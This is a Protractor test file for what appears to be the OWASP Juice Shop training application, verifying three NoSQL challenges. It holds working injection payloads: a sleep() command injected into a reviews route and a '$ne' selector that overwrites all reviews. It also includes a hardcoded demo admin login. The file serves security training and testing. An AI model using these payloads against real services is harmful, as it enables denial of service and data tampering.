'use strict'

var mongoose = require('mongoose')
var Secret = require('../../mongoose/secrets').Secret

describe('/#/search', function () {
  beforeEach(function () {
    browser.get('/#/search')
  })

  beforeAll(function (done) {
    mongoose.Promise = global.Promise

    mongoose.connect('mongodb://localhost:27017/test')
    var db = mongoose.connection
    db.once('open', function () {
      new Secret({ message: 'All your base are belong to us!' }).save().then(done, function () {
        console.log('Could not write into Secret collection test is going to fail')
        done()
      })
    }
    )
  })

  describe('challenge "NoSql Command Injection"', function () {
    protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'})

    it('should be possible to inject a command into the get route', function () {
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.get(\'/rest/product/sleep(1000)/reviews\');')
      browser.driver.sleep(5000)
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({challenge: 'NoSql Command Injection'})
  })

  describe('challenge "NoSql Injection"', function () {
    it('should be possible to inject a selector into the update route', function () {
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
      browser.driver.sleep(1000)
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({challenge: 'NoSql Injection'})
  })

  describe('challenge "NoSql Direct Access"', function () {
    it('should detect if a value was added to the secrets collection', function () {
      browser.driver.sleep(3000)
      browser.get(browser.baseUrl + '/#/search')
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({challenge: 'NoSql Direct Access'})
  })
})
